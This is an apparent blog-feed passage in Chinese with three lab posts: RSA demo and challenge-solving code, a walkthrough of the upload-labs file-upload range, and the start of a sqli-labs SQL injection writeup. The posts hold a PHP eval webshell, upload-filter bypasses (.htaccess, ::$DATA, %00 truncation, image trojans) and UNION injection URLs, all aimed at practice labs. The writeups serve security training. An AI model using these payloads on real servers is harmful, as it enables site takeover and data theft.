class="string">'b1'</span>, <span class="string">'b2'</span>, <span class="string">'b3'</span>, <span class="string">'b4'</span>, <span class="string">'b5'</span>, <span class="string">'b6'</span>, <span class="string">'b7'</span>, <span class="string">'b8'</span>, <span class="string">'b9'</span>, <span class="string">'ba'</span>, <span class="string">'bb'</span>, <span class="string">'bc'</span>, <span class="string">'bd'</span>, <span class="string">'be'</span>, <span class="string">'bf'</span>,</span><br><span class="line">               <span class="string">'c0'</span>, <span class="string">'c1'</span>, <span class="string">'c2'</span>, <span class="string">'c3'</span>, <span class="string">'c4'</span>, <span class="string">'c5'</span>, <span class="string">'c6'</span>, <span class="string">'c7'</span>, <span class="string">'c8'</span>, <span class="string">'c9'</span>, <span class="string">'ca'</span>, <span class="string">'cb'</span>, <span class="string">'cc'</span>, <span class="string">'cd'</span>, <span class="string">'ce'</span>, <span class="string">'cf'</span>,</span><br><span class="line">               <span class="string">'d0'</span>, <span class="string">'d1'</span>, <span class="string">'d2'</span>, <span class="string">'d3'</span>, <span class="string">'d4'</span>, <span class="string">'d5'</span>, <span class="string">'d6'</span>, <span class="string">'d7'</span>, <span class="string">'d8'</span>, <span class="string">'d9'</span>, <span class="string">'da'</span>, <span class="string">'db'</span>, <span class="string">'dc'</span>, <span class="string">'dd'</span>, <span class="string">'de'</span>, <span class="string">'df'</span>,</span><br><span class="line">               <span class="string">'e0'</span>, <span class="string">'e1'</span>, <span class="string">'e2'</span>, <span class="string">'e3'</span>, <span class="string">'e4'</span>, <span class="string">'e5'</span>, <span class="string">'e6'</span>, <span class="string">'e7'</span>, <span class="string">'e8'</span>, <span class="string">'e9'</span>, <span class="string">'ea'</span>, <span class="string">'eb'</span>, <span class="string">'ec'</span>, <span class="string">'ed'</span>, <span class="string">'ee'</span>, <span class="string">'ef'</span>,</span><br><span class="line">               <span class="string">'f0'</span>, <span class="string">'f1'</span>, <span class="string">'f2'</span>, <span class="string">'f3'</span>, <span class="string">'f4'</span>, <span class="string">'f5'</span>, <span class="string">'f6'</span>, <span class="string">'f7'</span>, <span class="string">'f8'</span>, <span class="string">'f9'</span>, <span class="string">'fa'</span>, <span class="string">'fb'</span>, <span class="string">'fc'</span>, <span class="string">'fd'</span>, <span class="string">'fe'</span>, <span class="string">'ff'</span>,]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexToRaw</span><span class="params">(hx)</span>:</span>   <span class="comment">#十六进制字符串转换为raw</span></span><br><span class="line">    raw = binascii.unhexlify(hx);</span><br><span class="line">    <span class="keyword">return</span> raw;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rawToHex</span><span class="params">(raw)</span>:</span>  <span class="comment">#raw串转换为十六进制      raw原始字符串</span></span><br><span class="line">    <span class="comment">#hx = binascii.hexlify(raw);</span></span><br><span class="line">    hx = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> raw:</span><br><span class="line">        <span class="keyword">if</span> type(r) != int:</span><br><span class="line">            r = ord(r);</span><br><span class="line">        hx += rawToHexLUT[r];</span><br><span class="line">    <span class="keyword">return</span> bytes(hx, <span class="string">'UTF-8'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#扩展欧几里得算法</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        q = a // b;</span><br><span class="line">        r = a % b;</span><br><span class="line">        (s, t) = egcd(b, r)</span><br><span class="line">        <span class="keyword">return</span> (t, s - q * t)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invmod</span><span class="params">(a, N)</span>:</span>   <span class="comment"># Returns a^-1 mod N 乘法逆运算</span></span><br><span class="line">    (x, y) = egcd(a, N);</span><br><span class="line">    <span class="keyword">return</span> x % N;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_demo1</span><span class="params">()</span>:</span></span><br><span class="line">    p = <span class="number">71</span>;</span><br><span class="line">    q = <span class="number">77</span>;</span><br><span class="line">    N = p*q;</span><br><span class="line">    et = (p<span class="number">-1</span>)*(q<span class="number">-1</span>);</span><br><span class="line">    e = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">assert</span>((et%e) != <span class="number">0</span>); </span><br><span class="line">    d = invmod(e,et)</span><br><span class="line">    message = <span class="number">42</span>;</span><br><span class="line">    encrypted = mypow(message, e, N);</span><br><span class="line">    decrypted = mypow(encrypted, d, N);</span><br><span class="line">    <span class="keyword">assert</span>(message == decrypted)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_demo2</span><span class="params">()</span>:</span></span><br><span class="line">    e = <span class="number">3</span>;</span><br><span class="line">    p = <span class="number">4</span>;</span><br><span class="line">    q = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span> ((p % e) == <span class="number">1</span>):</span><br><span class="line">        p = generatePrime(<span class="number">1024</span>); <span class="comment">#产生一个最大为 1024 bit的随机素数</span></span><br><span class="line">    <span class="keyword">while</span> ((q % e) == <span class="number">1</span>):</span><br><span class="line">        q = generatePrime(<span class="number">1024</span>); <span class="comment">#产生一个最大为 1024 bit的随机素数</span></span><br><span class="line">    N = p*q;</span><br><span class="line">    phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">assert</span>((phi%e) != <span class="number">0</span>);</span><br><span class="line">    d = invmod(e, phi);</span><br><span class="line">    message = <span class="number">42</span>;</span><br><span class="line">    encrypted = mypow(message, e, N);</span><br><span class="line">    decrypted = mypow(encrypted, d, N);</span><br><span class="line">    <span class="keyword">assert</span>(message == decrypted);</span><br><span class="line">    rawMessage = <span class="string">b'May the Force be with you'</span></span><br><span class="line">    hexMessage = rawToHex(rawMessage);</span><br><span class="line">    intMessage = int(hexMessage, <span class="number">16</span>);  </span><br><span class="line">    encrypted = mypow(intMessage, e, N);</span><br><span class="line">    decrypted = mypow(encrypted, d, N);</span><br><span class="line">    <span class="keyword">assert</span>(intMessage == decrypted)</span><br><span class="line">    <span class="keyword">assert</span>(hexToRaw(hex(intMessage)[<span class="number">2</span>:]) == rawMessage);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    rsa_demo1();</span><br><span class="line">    rsa_demo2();</span><br><span class="line">    print(<span class="string">"success"</span>)</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>实验三，密码数学挑战赛原题，详见<br>2016密码挑战赛（RSA 加密体制破译）解题过程： <a href="https://blog.csdn.net/yangfan695695/article/details/80648086" target="_blank" rel="noopener">https://blog.csdn.net/yangfan695695/article/details/80648086</a><br>RSA常见攻击方法： <a href="https://www.tr0y.wang/2017/11/06/CTFRSA/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2017/11/06/CTFRSA/index.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-    </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Base</span><br><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> is_</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_list</span><span class="params">(string,list)</span>:</span>   </span><br><span class="line">    <span class="keyword">print</span> string,<span class="string">'***************************************************************************'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">        <span class="keyword">if</span>(i&lt;=<span class="number">9</span>):<span class="keyword">print</span>  str(i),<span class="string">''</span>,list[i],str(i)</span><br><span class="line">        <span class="keyword">else</span>:<span class="keyword">print</span> str(i),list[i],str(i)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryped</span><span class="params">(num,string,string2)</span>:</span> </span><br><span class="line">    c,a,count=[],<span class="string">''</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">global</span> result  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">        a+=string[i]</span><br><span class="line">        count+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(count%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">            count=<span class="number">0</span></span><br><span class="line">            c.append(a)</span><br><span class="line">            a=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        a+=chr(int(i.upper(), <span class="number">16</span>))   </span><br><span class="line">    result += str(a) </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Part'</span>,num,<span class="string">'----&gt;'</span>,a</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(x,n,N)</span>:</span> </span><br><span class="line">    <span class="string">'''快速模取幂算法'''</span><span class="comment">#x**n(mod N)</span></span><br><span class="line">    res=<span class="number">1</span>  </span><br><span class="line">    <span class="keyword">while</span> n&gt;<span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">if</span>(n &amp; <span class="number">1</span>): </span><br><span class="line">            res=(res*x)%N </span><br><span class="line">        x=(x*x)%N </span><br><span class="line">        n &gt;&gt;= <span class="number">1</span> </span><br><span class="line">    <span class="keyword">return</span> res </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">match</span><span class="params">(allkinds,n,e,c,num_of_Frame)</span>:</span></span><br><span class="line">    a=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(allkinds)):</span><br><span class="line">       a+=Base.dec2hex(ord(allkinds[i]))</span><br><span class="line">    n2=int(Base.hex2dec(n))</span><br><span class="line">    a2=int(Base.hex2dec(<span class="string">'0x9876543210ABCDEF'</span>+Base.dec2hex(num_of_Frame).zfill(<span class="number">8</span>)+<span class="string">'0'</span>*<span class="number">88</span>+a))</span><br><span class="line">    e2=int(Base.hex2dec(e))</span><br><span class="line">    un_c=fun(a2,e2,n2)</span><br><span class="line">    un_c2=Base.dec2hex(str(un_c))</span><br><span class="line">    <span class="keyword">if</span>(un_c2==c):<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">m,N,e,c=[],[],[],[]</span><br><span class="line">filename=[<span class="string">'Frame'</span>+str(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>):</span><br><span class="line">    fd = open(filename[i],<span class="string">'r'</span>)</span><br><span class="line">    m.append(fd.read())</span><br><span class="line">    fd.close()</span><br><span class="line"><span class="keyword">for</span> frame <span class="keyword">in</span> m:</span><br><span class="line">    N.append(frame[<span class="number">0</span>:<span class="number">256</span>])   <span class="comment">#0-256 N</span></span><br><span class="line">    e.append(frame[<span class="number">256</span>:<span class="number">512</span>])  <span class="comment">#256-512 E</span></span><br><span class="line">    c.append(frame[<span class="number">512</span>:<span class="number">768</span>]) <span class="comment">#512-768 C</span></span><br><span class="line">print_list(<span class="string">'N='</span>,N)</span><br><span class="line">print_list(<span class="string">'e='</span>,e)</span><br><span class="line">print_list(<span class="string">'c='</span>,c)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">decryped(<span class="number">0</span>,<span class="string">'4D79207365637265'</span>,<span class="string">'From Frame 0 and 4'</span>)</span><br><span class="line">decryped(<span class="number">1</span>,<span class="string">'7420697320612066'</span>,<span class="string">'From Frame 3,8,12,16 and 20'</span>)</span><br><span class="line">decryped(<span class="number">5</span>,<span class="string">'696E737465696E2E'</span>,<span class="string">'From Frame 19'</span>)</span><br><span class="line">decryped(<span class="number">6</span>,<span class="string">'2054686174206973'</span>,<span class="string">'From Frame 2'</span>)</span><br><span class="line">decryped(<span class="number">7</span>,<span class="string">'20224C6F67696320'</span>,<span class="string">'From Frame 6'</span>)</span><br><span class="line">decryped(<span class="number">8</span>,<span class="string">'77696C6C20676574'</span>,<span class="string">'From Frame 10'</span>)</span><br><span class="line">decryped(<span class="number">9</span>,<span class="string">'20796F752066726F'</span>,<span class="string">'From Frame 14'</span>)</span><br><span class="line">decryped(<span class="number">10</span>,<span class="string">'6D204120746F2042'</span>,<span class="string">'From Frame 18'</span>)</span><br><span class="line">decryped(<span class="number">11</span>,<span class="string">'2E20496D6167696E'</span>,<span class="string">'From Frame 1'</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> match(<span class="string">'m A to B'</span>, N[<span class="number">18</span>], e[<span class="number">18</span>], c[<span class="number">18</span>], <span class="number">10</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">final_match</span><span class="params">(mingwen)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">if</span>(match(mingwen, N[i], e[i], c[i], j)):<span class="keyword">print</span> <span class="string">'seccessful'</span>,<span class="string">'Result is right!!'</span>,<span class="string">'Frame'</span>,i,<span class="string">'&lt;======&gt;'</span>,<span class="string">'Part'</span>,j</span><br><span class="line"> </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">以下都是我们的猜测字符串，然后进行匹配</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">mingwen2=[<span class="string">'ll take '</span>,<span class="string">'you ever'</span>,<span class="string">'ywhere. '</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mingwen2:</span><br><span class="line">    final_match(i)</span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 开发相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传靶场</title>
      <link href="/2019/11/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/"/>
      <url>/2019/11/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传靶场"><a href="#文件上传靶场" class="headerlink" title="文件上传靶场"></a>文件上传靶场</h2><p>整理磁盘的时候莫名其妙发现这个半年前写的blog没发，今天发上来，这是一个比较经典的文件上传靶场，类型比较全。<br><a id="more"></a><br><img src="https://s2.ax1x.com/2019/01/27/ku5SxS.png" alt="image"><br>不知道是因为玄学还是菜刀解析问题，我之前写php马是这样的</p><blockquote><p>&lt;?php eval($_GET[“a”])?&gt;</p></blockquote><p>但是今天发现这样写马根本连不上，菜刀无限返回200，清了N遍缓存也没用，无奈百度和询问dalao，得知应该这样写。</p><blockquote><p>&lt;?php @eval($_GET[“a”])?&gt;</p></blockquote><p>可是@的意思不少抑制报错吗，没有@最多是木马报错，会把菜刀密码暴露出来，这和菜刀的连接我觉得是半毛钱关系也没有。</p><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p>考点：前端验证绕过</p><p>方法1：</p><p>抓包然后把里面的jpg换成php即可</p><p>方法2：</p><p>利用firefox插件no js，关闭js，直接上传即可</p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p>考点：Content-Type方式绕过</p><p>讲一句话木马文件后缀改成jpg，然后抓包，把包里的jpg后缀改回php即可，满足了Content-Type的要求</p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><p>考点：黑名单绕过</p><p>看源码得知，不允许上传<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.asp</span>,<span class="selector-class">.aspx</span>,<span class="selector-class">.php</span>,.jsp</span><br></pre></td></tr></table></figure></p><p>但是过滤这些根本不够，有些后缀不在里面却可以被解析位里面这些。<br>例如：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">jsp </span><span class="keyword">jspx </span><span class="keyword">jspf</span></span><br></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">asp aspa cer  aspx</span></span><br></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php php3 php4 php5 phtml</span><br></pre></td></tr></table></figure><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">exe exee</span></span><br></pre></td></tr></table></figure><p>所以讲上传后缀改为php3 php4 php5 phtml均可以实现传马。</p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><p>考点：.htaccess文件绕过</p><p>.htaccess文件是一个配置文件，可以实现改变文件解析配置的作用，但是在windows下重名名不能命名为.htaccess，所以要使用命令行的ren指令才可以。(网上说不行，但是我实测是可以的）（双手挠头？？？）文件内容是</p><blockquote><p>AddType application/x-httpd-php .jpg</p></blockquote><p>意思是把jpg文件当作php来解析，但是.htaccess文件配置只有管理员开启才能使用，默认是关闭的。</p><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><p>考点：后缀大小写绕过</p><p>也很简单，就算php和Php不一样，但是都会解析成php，改个后缀即可。</p><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><p>考点：文件后缀（空）绕过</p><p>比如.php和.php 两个后缀是不一样的，后面那个后缀有一个空格，但是由于windows的解析特性，会忽略空格，所以.php 也会解析成php文件</p><h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><p>考点：文件后缀(点)绕过</p><p>和上面那个题类似，由于windows的特性，导致解析文件时会删去文件末尾的一个.，比如.php.会被解析成.php</p><h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><p>考点：::$DATA（Windows文件流绕过）</p><p>由于NTFS机制，一个文件可以携带多个文件流，但是windows自带的资源管理器只能读取宿主文件，寄宿文件是无法读取的。<br>比如命令</p><blockquote><p>echo abcd&gt;&gt;123.txt</p></blockquote><p>会把abcd写入123.txt中，但是如果命令改成这样</p><blockquote><p>echo abcd&gt;&gt;123.txt:456.txt</p></blockquote><p>abcd会被写入456.txt，但是读取的时候读的是宿主文件123.txt。里面显示为0字节，但是在实际的硬盘存储里，它由于456.txt文件流的存在，实际上是占字节的，那么如何读取b.txt里面的内容呢？</p><blockquote><p>notepad 123.txt:456.txt</p></blockquote><p>那么如果我们不写456.txt而写成::$DATA呢</p><blockquote><p>echo abcd&gt;&gt;123.txt::$DATA</p></blockquote><p>打开会直接显示为abcd，但是应用在文件上传里可以使后缀变得不一样，绕过黑名单检测机制。(也可以用来隐藏一些东西)</p><h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><p>考点：构造文件后缀绕过</p><p>waf先去除.然后去除空，再去除::$DATA，再黑名单检测有没有php之类的敏感字符。</p><p>我们可以构造后缀.php. .</p><p>那么waf先去除.再去除 ，然后剩下.php.，不在黑名单中，成功过waf</p><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><p>考点：双写文件后缀绕过</p><p>waf在检测到php后会将php删去，那我们可以构造后缀pphphp，将中间的php删去之后还留下一个php，这样可以达到文件解析的作用1</p><h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><p>考点：%00截断绕过（GET）</p><p>抓包，发现可以控制save_path在url后面加%00，函数在执行的时候会认为00是字符串末尾，后面将不会再进行处理。</p><h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><p>考点：%00截断绕过（POST）</p><p>(在post的数据)，后面加（hex）00字符</p><h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><p>考点：图片马绕过</p><p>找一张小一点的图片，在cmd命令行运行以下命令</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy <span class="number">1.</span>jpg/b+<span class="number">2.</span>txt <span class="number">3.</span>jpg</span><br></pre></td></tr></table></figure><p>即可制作图片马，上传即可</p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><p>考点：getimagesize图片类型绕过</p><p>运用上题命令也可绕过</p><h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><p>考点：php_exif模块图片类型绕过</p><p>看源码是使用exif_imagetype()检查是否为图片文件，依然使用windows的copy命令即可</p><h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><p>考点：二次渲染绕过</p><p>其实还是用copy命令制作的图片马，依然是差不多的。</p><h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><p>考点：条件竞争绕过</p><p>服务器是先允许任何文件上传，如果文件是php文件或者其它不允许上传的文件，就会把文件删掉，但是函数执行有一定的时间，使用bp200线程，一边上传，一边访问该文件（以phpinfo举例）当出现较大数据包时，即为成功。</p><h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><p>原理差不多，题目有bug做不了</p><h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><p>考点：move_uploaded_file()截断</p><p>同12题一样，用00绕过即可。</p><h1 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h1><p>考点：IIS6.0解析漏洞（一）</p><p>asa,cer,aspx都可以被解析成asp</p><p>见第三题。</p><h1 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h1><p>考点：IIS6.0解析漏洞（二）</p><p>比如asp;.jpg会以asp进行解析</p><p>或者asp/.jpg，前面的asp文件会正常解析。</p><h1 id="Pass-22"><a href="#Pass-22" class="headerlink" title="Pass-22"></a>Pass-22</h1><p>考点：IIS6.0解析漏洞（三）</p><p>在图片马后面加上/.php即可成功解析</p><h1 id="Pass-23"><a href="#Pass-23" class="headerlink" title="Pass-23"></a>Pass-23</h1><p>考点：CGI解析漏洞</p><p>asp/1.jpg，可以上传合法的“图片”（图片木马）然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。<br>这不是Nginx特有的漏洞，在IIS7.0、IIS7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-lab 1-65关放弃指北</title>
      <link href="/2019/11/02/Sqli/"/>
      <url>/2019/11/02/Sqli/</url>
      
        <content type="html"><![CDATA[<h2 id="Sqli-lab-1-65关放弃指北"><a href="#Sqli-lab-1-65关放弃指北" class="headerlink" title="Sqli-lab 1-65关放弃指北"></a><strong>Sqli-lab</strong> 1-65关放弃指北</h2><p>Sqli-lab通关writeup，寒假觉得自己太堕落了，对sql注入也仅仅只掌握了最基本的原理，所以决定把sqli刷一遍。<br>并且为了方便注入，我在sql语句后加入了</p><blockquote><p>echo $sql;</p></blockquote><p>这样可以方便学习。并且由于关卡数量比较庞大，每个关卡爆到表名就算完成任务（反正刷src也不能脱裤对吧）<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/index.php?id=1</span><br></pre></td></tr></table></figure></p><p>以上语句是SQli的基本语句，是以id为参数注入的，先写在前面。</p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>一进去，先是一个显示login name和password的页面。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:Dumb</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:Dumb</span></span><br></pre></td></tr></table></figure><p>我们给id加一个单引号看看<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure></p><p>报错，报错提示</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/index.php?id=1'--+</span></span><br></pre></td></tr></table></figure><p>加上注释符后，不报错，说明应该是字符型注入。</p><p>由于正常渗透测试的时候，是无法看到sql语句的（根本没有报错信息好吗），所以我们加入的echo仅供参考，具体分析从报错信息分析。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-<span class="literal">master</span>/Less-<span class="number">1</span>/index.php?<span class="attr">id=</span><span class="number">1</span>'<span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>--+</span><br></pre></td></tr></table></figure><p>有三个字段，查一下表名看看（已经判断过2，3为显示位）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:emails</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:3</span></span><br></pre></td></tr></table></figure><p>这样一个个查询效率可能有点低，可以把两个显示位均利用起来。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span 